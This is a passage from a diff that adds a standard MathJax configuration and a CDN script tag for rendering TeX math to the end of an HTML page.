+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+
+
+
+    
+</body>
+</html>
